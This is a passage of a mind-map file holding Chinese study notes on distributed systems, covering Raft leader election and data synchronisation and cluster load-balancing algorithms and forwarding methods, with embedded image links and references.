        <a href="http://thesecretlivesofdata.com/raft" rel="nofollow">Raft: Understandable Distributed Consensus</a>
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_1364057662" CREATED="1754750650977" MODIFIED="1754750650979"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      单个 Candidate 的竞选
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 单个 Candidate 的竞选" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#单个-candidate-的竞选">
</a>
    <p dir="auto">
      有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。
    </p>
    <ul dir="auto">
      <li>
        下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/065b183e4992f9a51bb45c98355fed7e98b1b861b439f33ddf6dbb583a4c6f94/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383031353839382e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/065b183e4992f9a51bb45c98355fed7e98b1b861b439f33ddf6dbb583a4c6f94/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383031353839382e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118015898.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
    

    <ul dir="auto">
      <li>
        此时 Node A 发送投票请求给其它所有节点。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9d43c2fc7686ef8dd692976ca1f20bf9c1f7ba7aa2c39dd7618802108266073f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383434353533382e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/9d43c2fc7686ef8dd692976ca1f20bf9c1f7ba7aa2c39dd7618802108266073f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383434353533382e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118445538.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
    

    <ul dir="auto">
      <li>
        其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e4174e3a1cbcaffeea1ba5790d6367f0cbc1f07f9011e3531f56cbbe54c8363c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383438333033392e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/e4174e3a1cbcaffeea1ba5790d6367f0cbc1f07f9011e3531f56cbbe54c8363c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383438333033392e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118483039.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
    

    <ul dir="auto">
      <li>
        之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d0bc594b7ea78bd62a8524ecf920645d87fc4e086899ae98ac6f26550ce6fc67/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383634303733382e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/d0bc594b7ea78bd62a8524ecf920645d87fc4e086899ae98ac6f26550ce6fc67/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131383634303733382e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521118640738.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1192954587" CREATED="1754750650979" MODIFIED="1754750650981"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      多个 Candidate 竞选
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 多个 Candidate 竞选" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#多个-candidate-竞选">
</a>
    <ul dir="auto">
      <li>
        如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ce9c9b6c3993b06876e41c7924bcfbffa5fa032e3461d3a255f3c02ebf43244f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131393230333334372e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/ce9c9b6c3993b06876e41c7924bcfbffa5fa032e3461d3a255f3c02ebf43244f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131393230333334372e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521119203347.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
    

    <ul dir="auto">
      <li>
        由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2b0d533c8fceb22996ac26dccf6a5d0f006baae7d129aaf74412b4ccc67d8d11/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131393336383731342e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/2b0d533c8fceb22996ac26dccf6a5d0f006baae7d129aaf74412b4ccc67d8d11/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313532313131393336383731342e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111521119368714.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1143894933" CREATED="1754750650981" MODIFIED="1754750650983"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据同步
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 数据同步" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#数据同步">
</a>
    <ul dir="auto">
      <li>
        来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fbef7ad6f73e20315249efff09c76e8de1402c2d49fdd2e1db7276e7aa030064/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37313535303431343130373537362e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/fbef7ad6f73e20315249efff09c76e8de1402c2d49fdd2e1db7276e7aa030064/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37313535303431343130373537362e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/71550414107576.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
    

    <ul dir="auto">
      <li>
        Leader 会把修改复制到所有 Follower。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/71d4b6237bdddf95f8e1db658d499b23401b50cc1cc943571be4d04bdb5327ad/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39313535303431343133313333312e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/71d4b6237bdddf95f8e1db658d499b23401b50cc1cc943571be4d04bdb5327ad/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39313535303431343133313333312e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/91550414131331.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
    

    <ul dir="auto">
      <li>
        Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/adb40537e6d5b86c6e8abb53270643df43dba85a6f3efad144eee3a7a434dd2d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3130313535303431343135313938332e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/adb40537e6d5b86c6e8abb53270643df43dba85a6f3efad144eee3a7a434dd2d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3130313535303431343135313938332e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/101550414151983.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
    

    <ul dir="auto">
      <li>
        此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。
      </li>
    </ul>
    <animated-image>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/172a3daf489440e9abff2982716f1fbf2cce56e8efb724fa77729fb397b06469/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313535303431343138323633382e676966" data-target="animated-image.originalLink" color="#ffffff"><img src="https://camo.githubusercontent.com/172a3daf489440e9abff2982716f1fbf2cce56e8efb724fa77729fb397b06469/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f3131313535303431343138323633382e676966" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/111550414182638.gif" data-target="animated-image.originalImage"/>
    </a></animated-image>
    <br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_306222149" CREATED="1754750650983" MODIFIED="1754750650985"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E5%88%86%E5%B8%83%E5%BC%8F.md#参考">
</a>
    <ul dir="auto">
      <li>
        倪超. 从 Paxos 到 ZooKeeper : 分布式一致性原理与实践 [M]. 电子工业出版社, 2015.
      </li>
      <li>
        <a href="https://redis.io/topics/distlock" rel="nofollow">Distributed locks with Redis</a>
      </li>
      <li>
        <a href="http://www.linkedkeeper.com/detail/blog.action?bid=1023" rel="nofollow">浅谈分布式锁</a>
      </li>
      <li>
        <a href="http://www.dengshenyu.com/java/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/2017/10/23/zookeeper-distributed-lock.html" rel="nofollow">基于 Zookeeper 的分布式锁</a>
      </li>
      <li>
        <a href="https://www.cnblogs.com/savorboard/p/distributed-system-transaction-consistency.html" rel="nofollow">聊聊分布式事务，再说说解决方案</a>
      </li>
      <li>
        <a href="https://coolshell.cn/articles/10910.html" rel="nofollow">分布式系统的事务处理</a>
      </li>
      <li>
        <a href="https://juejin.im/entry/577c6f220a2b5800573492be" rel="nofollow">深入理解分布式事务</a>
      </li>
      <li>
        <a href="http://www.colooshiki.com/index.php/2017/04/20/what-is-cap-theorem-in-distributed-database-system/" rel="nofollow">What is CAP theorem in distributed database system?</a>
      </li>
      <li>
        <a href="http://harry.me/blog/2014/12/27/neat-algorithms-paxos/" rel="nofollow">NEAT ALGORITHMS - PAXOS</a>
      </li>
      <li>
        <a href="https://angus.nyc/2012/paxos-by-example/" rel="nofollow">Paxos By Example</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1497478506" CREATED="1754749809774" MODIFIED="1754750725009" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      集群
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_685494935" CREATED="1754750650987" MODIFIED="1754750650989"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、负载均衡
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、负载均衡" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#一负载均衡">
</a>
    <p dir="auto">
      集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。
    </p>
    <p dir="auto">
      负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。
    </p>
    <p dir="auto">
      负载均衡器可以用来实现高可用以及伸缩性：
    </p>
    <ul dir="auto">
      <li>
        高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；
      </li>
      <li>
        伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。
      </li>
    </ul>
    <p dir="auto">
      负载均衡器运行过程包含两个部分：
    </p>
    <ol dir="auto">
      <li>
        根据负载均衡算法得到转发的节点；
      </li>
      <li>
        进行转发。
      </li>
    </ol>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_1044742007" CREATED="1754750650989" MODIFIED="1754750650989"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      负载均衡算法
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_255804760" CREATED="1754750650990" MODIFIED="1754750650992"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 轮询（Round Robin）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 轮询（Round Robin）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#1-轮询round-robin">
</a>
    <p dir="auto">
      轮询算法把每个请求轮流发送到每个服务器上。
    </p>
    <p dir="auto">
      下图中，一共有 6 个客户端产生了 6 个请求，这 6 个请求按 (1, 2, 3, 4, 5, 6) 的顺序发送。(1, 3, 5) 的请求会被发送到服务器 1，(2, 4, 6) 的请求会被发送到服务器 2。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6b4ca1aba6b441b049ea438103f58697279b2dc11d1d63d089fd197bb15b314c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39646161333631362d303061342d343863342d393134362d3739326463383439396265332e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/6b4ca1aba6b441b049ea438103f58697279b2dc11d1d63d089fd197bb15b314c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f39646161333631362d303061342d343863342d393134362d3739326463383439396265332e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9daa3616-00a4-48c4-9146-792dc8499be3.jpg"/>
    </a><br/>
    

    <p dir="auto">
      该算法比较适合每个服务器的性能差不多的场景，如果有性能存在差异的情况下，那么性能较差的服务器可能无法承担过大的负载（下图的 Server 2）。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d643c928ac417740d860da97092691ae9ffbfd8ec070d1506268d1d406ec264b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62666561383737322d643031622d346135312d386164632d6564666437643364636538342e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/d643c928ac417740d860da97092691ae9ffbfd8ec070d1506268d1d406ec264b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62666561383737322d643031622d346135312d386164632d6564666437643364636538342e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bfea8772-d01b-4a51-8adc-edfd7d3dce84.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_963968395" CREATED="1754750650992" MODIFIED="1754750650994"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 加权轮询（Weighted Round Robbin）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 加权轮询（Weighted Round Robbin）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#2-加权轮询weighted-round-robbin">
</a>
    <p dir="auto">
      加权轮询是在轮询的基础上，根据服务器的性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值。
    </p>
    <p dir="auto">
      例如下图中，服务器 1 被赋予的权值为 5，服务器 2 被赋予的权值为 1，那么 (1, 2, 3, 4, 5) 请求会被发送到服务器 1，(6) 请求会被发送到服务器 2。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f63202c25a09d39f4a177d131ce4301977d6352b627026c8bc757e8684567d67/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34616238373731372d653236342d343233322d383235642d3861616630386631346538622e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/f63202c25a09d39f4a177d131ce4301977d6352b627026c8bc757e8684567d67/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34616238373731372d653236342d343233322d383235642d3861616630386631346538622e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4ab87717-e264-4232-825d-8aaf08f14e8b.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1039892050" CREATED="1754750650994" MODIFIED="1754750650996"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 最少连接（least Connections）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 最少连接（least Connections）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#3-最少连接least-connections">
</a>
    <p dir="auto">
      由于每个请求的连接时间不一样，使用轮询或者加权轮询算法的话，可能会让一台服务器当前连接数过大，而另一台服务器的连接过小，造成负载不均衡。
    </p>
    <p dir="auto">
      例如下图中，(1, 3, 5) 请求会被发送到服务器 1，但是 (1, 3) 很快就断开连接，此时只有 (5) 请求连接服务器 1；(2, 4, 6) 请求被发送到服务器 2，只有 (2) 的连接断开，此时 (6, 4) 请求连接服务器 2。该系统继续运行时，服务器 2 会承担过大的负载。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ca9ad7215bdc9e43952ca3c2dca6489ad0fc3132627bb9fddee51e470dac9525/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65393864656235612d643564342d343239342d616139622d3932323064343438333430332e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/ca9ad7215bdc9e43952ca3c2dca6489ad0fc3132627bb9fddee51e470dac9525/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65393864656235612d643564342d343239342d616139622d3932323064343438333430332e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e98deb5a-d5d4-4294-aa9b-9220d4483403.jpg"/>
    </a><br/>
    

    <p dir="auto">
      最少连接算法就是将请求发送给当前最少连接数的服务器上。
    </p>
    <p dir="auto">
      例如下图中，服务器 1 当前连接数最小，那么新到来的请求 6 就会被发送到服务器 1 上。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c23ecfcd3e327707458a7d96d75fc825701f4103253976f4551d575f29752d3b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34336433323361632d396630372d346534612d613331352d3465616638633338373636632e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/c23ecfcd3e327707458a7d96d75fc825701f4103253976f4551d575f29752d3b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34336433323361632d396630372d346534612d613331352d3465616638633338373636632e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/43d323ac-9f07-4e4a-a315-4eaf8c38766c.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1318723645" CREATED="1754750650997" MODIFIED="1754750650999"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 加权最少连接（Weighted Least Connection）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 加权最少连接（Weighted Least Connection）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#4-加权最少连接weighted-least-connection">
</a>
    <p dir="auto">
      在最少连接的基础上，根据服务器的性能为每台服务器分配权重，再根据权重计算出每台服务器能处理的连接数。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1232058271" CREATED="1754750650999" MODIFIED="1754750651001"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 随机算法（Random）
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 随机算法（Random）" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#5-随机算法random">
</a>
    <p dir="auto">
      把请求随机发送到服务器上。
    </p>
    <p dir="auto">
      和轮询算法类似，该算法比较适合服务器性能差不多的场景。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/80b90a9c1927e51e422ade18ccbc6e674fd595335622129c88380b39084b4fb4/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61343261643361372d333537342d346334382d613738332d6564336430386130363838612e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/80b90a9c1927e51e422ade18ccbc6e674fd595335622129c88380b39084b4fb4/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61343261643361372d333537342d346334382d613738332d6564336430386130363838612e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a42ad3a7-3574-4c48-a783-ed3d08a0688a.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_331493314" CREATED="1754750651001" MODIFIED="1754750651004"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 源地址哈希法 (IP Hash)
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. 源地址哈希法 (IP Hash)" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#6-源地址哈希法-ip-hash">
</a>
    <p dir="auto">
      源地址哈希通过对客户端 IP 计算哈希值之后，再对服务器数量取模得到目标服务器的序号。
    </p>
    <p dir="auto">
      可以保证同一 IP 的客户端的请求会转发到同一台服务器上，用来实现会话粘滞（Sticky Session）
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/abd11dedbaba2330303955823491bba655e699706e5f969d0b7769d9d22ca8f9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30663339396139662d313335312d346232642d623861342d3265626538326231613730332e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/abd11dedbaba2330303955823491bba655e699706e5f969d0b7769d9d22ca8f9/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30663339396139662d313335312d346232642d623861342d3265626538326231613730332e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0f399a9f-1351-4b2d-b8a4-2ebe82b1a703.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1094378890" CREATED="1754750651004" MODIFIED="1754750651004"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      转发实现
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_662655422" CREATED="1754750651005" MODIFIED="1754750651007"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. HTTP 重定向
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. HTTP 重定向" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#1-http-重定向">
</a>
    <p dir="auto">
      HTTP 重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的 IP 地址之后，将该地址写入 HTTP 重定向报文中，状态码为 302。客户端收到重定向报文之后，需要重新向服务器发起请求。
    </p>
    <p dir="auto">
      缺点：
    </p>
    <ul dir="auto">
      <li>
        需要两次请求，因此访问延迟比较高；
      </li>
      <li>
        HTTP 负载均衡器处理能力有限，会限制集群的规模。
      </li>
    </ul>
    <p dir="auto">
      该负载均衡转发的缺点比较明显，实际场景中很少使用它。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/500caafaa1109d720b9f2aecf22c7b85e3a93f4fb6e84c8b1f947ea99d54ce6a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30326131666266642d376139642d343131342d393564662d6361323434353538376131662e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/500caafaa1109d720b9f2aecf22c7b85e3a93f4fb6e84c8b1f947ea99d54ce6a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30326131666266642d376139642d343131342d393564662d6361323434353538376131662e6a7067" width="500px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/02a1fbfd-7a9d-4114-95df-ca2445587a1f.jpg"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1053720696" CREATED="1754750651007" MODIFIED="1754750651009"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. DNS 域名解析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. DNS 域名解析" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9B%86%E7%BE%A4.md#2-dns-域名解析">
</a>
    <p dir="auto">
      在 DNS 解析域名的同时使用负载均衡算法计算服务器 IP 地址。
    </p>
    <p dir="auto">
      优点：
    </p>
    <ul dir="auto">
      <li>
        DNS 能够根据地理位置进行域名解析，返回离用户最近的服务器 IP 地址。
      </li>
    </ul>
    <p dir="auto">
      缺点：
    </p>
    <ul dir="auto">
      <li>
        由于 DNS 具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改 DNS 记录时，需要过很长一段时间才能生效。
      </li>
    </ul>
    <p dir="auto">
